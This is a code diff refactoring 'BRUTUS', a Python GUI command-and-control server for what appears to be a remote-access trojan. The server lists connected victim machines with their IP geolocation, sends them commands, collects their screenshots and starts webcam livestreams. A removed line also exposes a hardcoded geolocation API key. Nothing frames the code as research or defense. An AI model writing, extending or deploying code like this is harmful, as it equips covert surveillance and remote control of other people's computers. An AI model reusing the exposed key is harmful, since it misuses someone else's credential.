@@ -17,24 +17,26 @@ from multiprocessing import Process
 import threading
 import requests
 import json
+from bs4 import BeautifulSoup
+import locator
 
 
-window = None
-video_thread = None
+
+""" constants """
+
+VERSION = "BRUTUS V. 1.0 Beta"
+CURRENT_FOLDER = os.path.dirname(os.path.realpath(__file__))
 HOST = socket.gethostname()
 PORT = 8080
 
-
-connections = {}
-gui = []
-
+""" globals """
 
 keyboard = Controller()
-current_folder = os.path.dirname(os.path.realpath(__file__))
-
-VERSION = "BRUTUS V. 1.0 Beta"
 ip = ""
-API_KEY = "at_NRyhPs30wbLFz6eye9U6ezykeWjPg&ipAddress"
+connections = {}
+window = None
+video_thread = None
+
 
 
 class MyMainWindow(QtWidgets.QMainWindow):
@@ -46,6 +48,7 @@ class MyMainWindow(QtWidgets.QMainWindow):
         self.setWindowTitle("Brutus")
         self.setFixedSize(690, 540)
         self.setWindowIcon(QIcon('brutus-icon.png'))
+
         try:
             r = requests.get('https://api.ipify.org?format=json', timeout=15)
             content = r.content
@@ -61,8 +64,10 @@ class MyMainWindow(QtWidgets.QMainWindow):
         
     def get_command(self):
         global video_thread, ip
+
         def on_press(key):
             global video_thread
+
             if str(key) == "Key.enter":
                 command = self.Input.text()
                 if self.Input.text() == "ip" or self.Input.text() == "get ip":
@@ -78,10 +83,11 @@ class MyMainWindow(QtWidgets.QMainWindow):
                     self.Output.addItem(output_text)
                     self.Input.clear()
                 elif self.Input.text() == "show_clients" or self.Input.text() == "show clients" or self.Input.text() == "sc":
-                    active_connections = "\n".join(f"{key}\t\t{connections[key].addr}\t\t{ConnectionHandler.get_location(connections[key].addr[0])}" for key in connections.keys())
+                    active_connections = "\n".join(f"{key}\t\t{connections[key].addr}\t\t{locator.get_location(connections[key].addr[0])}" for key in connections.keys())
                     self.Output.addItem(f"\nID\t\t       Address\t\t\t   Location\n\n{active_connections}")
                     self.Input.clear()
                 elif "@" in self.Input.text():  
+
                     try:
                         print(connections)
                         receiver = command.split("@")[0]
@@ -92,6 +98,7 @@ class MyMainWindow(QtWidgets.QMainWindow):
                     except Exception as error:
                         print(error)
                         self.Output.addItem("[ ! ] ERROR Client not found.")
+
         with Listener(on_press=on_press) as listener:
             listener.join()
 
@@ -106,19 +113,6 @@ class ConnectionHandler(asyncore.dispatcher_with_send):
         self.window = window
         self.id = iD
         self.screenshot_number = 1
-
-    def get_location(ip):
-        global API_KEY
-        location = ""
-        try:
-            r = requests.get(f"https://geo.ipify.org/api/v1?apiKey={API_KEY}ipAddress={ip}", timeout=5)
-            content = r.content
-            data = json.loads(content)
-            location = f"{data['location']['country']} | {data['location']['region']} | {data['location']['city']}"
-            print(location)
-            return location
-        except:
-            return location
     
     def video_stream():
         os.system("python webcam-host.py")
@@ -132,17 +126,17 @@ class ConnectionHandler(asyncore.dispatcher_with_send):
         if ConnectionHandler.receiving_image:
             data = self.recv(809600)
             image_name = f"Screenshot_ID{self.id}_NUM{self.screenshot_number}.png"
+
             with open(image_name, "wb") as file:
                 file.write(data)
+                
             self.screenshot_number += 1
-            saved_image_path = os.path.join(current_folder, image_name)
+            saved_image_path = os.path.join(CURRENT_FOLDER, image_name)
             self.window.Output.addItem(f"\n{time.strftime('%H:%M:%S')} Screenshot saved to: {saved_image_path}")
             ConnectionHandler.receiving_image = False
-            
-        
         else:
             data = self.recv(4096).decode("Cp1252")
-            print(data)
+
             if data == "Taken Screenshot":
                 ConnectionHandler.receiving_image = True
             elif data == "STARTING LIVESTREAM":
@@ -185,11 +179,11 @@ class Server(asyncore.dispatcher):
 
   
 def show_window():
+    global window
     print("Showing window...")
     application = QtWidgets.QApplication(sys.argv)
     window = MyMainWindow()
     threading.Thread(target=window.get_command).start()
-    gui.append(window)
     window.show()
     sys.exit(application.exec_())
 
@@ -197,7 +191,7 @@ def show_window():
 def main():
     threading.Thread(target=show_window).start()
     time.sleep(2)
-    server = Server(HOST, PORT, gui[0])
+    server = Server(HOST, PORT, window)
     print("Server running!")
     asyncore.loop()
 
